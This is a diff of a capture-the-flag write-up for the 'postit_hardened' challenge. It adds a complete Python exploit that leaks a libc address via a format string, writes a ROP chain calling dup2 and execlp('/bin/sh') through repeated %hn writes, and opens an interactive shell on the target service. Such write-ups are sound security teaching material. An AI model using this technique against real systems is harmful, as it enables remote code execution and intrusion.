@@ -1,6 +1,3 @@
-# postit_hardened
-
-tl;dr - This challenge is a hardened version of the pwnies 'postit' challenge (in particular, the stack is set no-execute).  A stack-based buffer overflow is used to get past part 1, and a ROP payload can be used to exec a shell in the second part by leveraging a not-so-straightforward format string vulnerability.
 
 The binary can be downloaded from http://treasure.pwnies.dk/2f75f56cd7773114dd8b5aa5f64fb347/postit-hardened
 
@@ -110,3 +107,152 @@ Due to some strange behavior with `dprintf()`, I could not chain together pointe
 
 The provided exploit relies on the socket library written by hellman of MSLC.  Library can be found at https://github.com/hellman/sock and thanks to hellman for the hard work.
 
+```python
+#!/usr/bin/python
+import telnetlib
+import time
+from sock import Sock
+
+# connection settings
+host = '127.0.0.1'
+port = '9999'
+
+def create_connection():
+    sock = Sock(host+':'+port, timeout=500)
+    print '[+] Connected to ' + host+':'+port
+    return sock
+
+def close_connection(sock):
+    sock.close()
+    print "[+] Closed socket."
+
+def put_file(sock, fname, text):
+    sock.read_until('? ')
+    sock.send(win_num_game)
+    sock.read_until('? ')
+    sock.send('1'+' '*98)
+    sock.read_until('name? ')
+    sock.send(fname + '\n')
+    sock.read_until('socket.\n')
+    sock.send(text)
+
+def print_file(sock, fname):
+    sock.read_until('? ')
+    sock.send(win_num_game)
+    sock.read_until('? ')
+    sock.send('2'+' '*98)
+    sock.read_until('note? ')
+    sock.send(fname + '\n')
+    return sock.read_until('end')
+
+# input used to win the number guess game
+win_num_game = '218959117'+ '\x0d'*11 + '\n'
+# filename to use on the server side
+file_name = 'testfoo'
+
+# put file to leak libc address
+fmt_string_libc = '%18$x end'
+s = create_connection()
+put_file(s, file_name, fmt_string_libc)
+print '[+] Sent format string to find libc address'
+close_connection(s)
+
+# CHANGE THESE to offsets that make sense with your libc
+libc_offset = 0x34827
+dup2_offset = 0xdc0b0
+execlp_offset = 0xb6ba0
+binsh_offset = 0x1615a4
+
+s = create_connection()
+out = print_file(s, file_name)
+libc_address = int(out[:8], 16) - libc_offset 
+print '[+] Got libc address: ' + str(hex(libc_address))
+dup2_addr = libc_address + dup2_offset
+execlp_addr = libc_address + execlp_offset
+binsh_addr = libc_address + binsh_offset
+print '[+] dup2() address: ' + str(hex(dup2_addr))
+print '[+] execlp() address: ' + str(hex(execlp_addr))
+print '[+] \'/bin/sh\' address: ' + str(hex(binsh_addr))
+close_connection(s)
+
+# now that have we addr of dup2 and execlp, we generate the format string.
+# the rop_tuples data structure is a list of 2-tuples consisting of
+# the low two bytes of the destination memory address and its desired contents
+pop2ret = 0x8048a7b
+rop_tuples = [
+    (0x41a2, (dup2_addr & 0xffff)),         # addr of dup2()
+    (0x41a4, (dup2_addr >> 16)),
+    (0x41a6, (pop2ret & 0xffff)),           # pop esi; pop ebp; ret 
+    (0x41a8, (pop2ret >> 16)), 
+    (0x41aa, 0x0004),                       # client sock 
+    (0x41ac, 0x0000),  
+    (0x41ae, 0x0000),                       # fd 
+    (0x41b0, 0x0000),
+    (0x41b2, (dup2_addr & 0xffff)),         # addr of dup2()
+    (0x41b4, (dup2_addr >> 16)),
+    (0x41b6, (pop2ret & 0xffff)),           # pop esi; pop ebp; ret 
+    (0x41b8, (pop2ret >> 16)),
+    (0x41ba, 0x0004),                       # client sock 
+    (0x41bc, 0x0000),
+    (0x41be, 0x0001),                       # fd 
+    (0x41c0, 0x0000),
+    (0x41c2, (dup2_addr & 0xffff)),         # addr of dup2()
+    (0x41c4, (dup2_addr >> 16)),
+    (0x41c6, (pop2ret & 0xffff)),           # pop esi; pop ebp; ret 
+    (0x41c8, (pop2ret >> 16)),
+    (0x41ca, 0x0004),                       # client sock 
+    (0x41cc, 0x0000),
+    (0x41ce, 0x0002),                       # fd 
+    (0x41d0, 0x0000),
+    (0x41d2, (execlp_addr & 0xffff)),       # addr of execlp()
+    (0x41d4, (execlp_addr >> 16)),
+    # next 4 bytes can be junk
+    (0x41da, (binsh_addr & 0xffff)),        # addr of '/bin/sh'
+    (0x41dc, (binsh_addr >> 16)),
+    (0x41de, (binsh_addr & 0xffff)),        # addr of '/bin/sh'
+    (0x41e0, (binsh_addr >> 16)), 
+    (0x41e2, 0x0000),                       # NULL
+    (0x41e4, 0x0000),
+    (0x417a, 0x419e)                        # modify saved ebp to ret to our
+                                            # rop chain later
+]
+
+# direct access parameter to generate pointer in mem (0xXXXX412a)
+ptr_dap = '25'
+# direct access parameter to write to mem location specified by pointer
+memwrite_dap = '37'
+fmt_string_exploit = ''
+for tup in rop_tuples:
+    # split tuple into target address and contents
+    addr, contents = tup
+    # first fmt string creates the pointer in memory we need
+    t1 = '%{0}c%{1}$hn'.format(addr, ptr_dap)
+    # pad it out to 4096 so we cycle back to another call of dprintf()
+    if (len(t1) < 4095):
+        t1 += 'A'*(4095-len(t1))
+    # now that we have a pointer, use it to write 2 bytes into memory
+    if (contents != 0):
+        t2 = '%{0}c%{1}$hn'.format(contents, memwrite_dap) 
+    else:
+        t2 = '%{0}$hn'.format(memwrite_dap)
+    # pad it out to 4096 so we cycle back to another call of dprintf()
+    if (len(t2) < 4095):
+        t2 += 'A'*(4095-len(t2))
+    fmt_string_exploit += t1 + t2 
+
+# put file to trigger exploit
+s = create_connection()
+put_file(s, file_name, fmt_string_exploit)
+print '[+] Sent exploit format string'
+close_connection(s)
+
+# trigger exploit
+s = create_connection()
+out = print_file(s, file_name)
+
+print 'Might have a shell...'
+
+t = telnetlib.Telnet()
+t.sock = s.sock
+t.interact()
+```
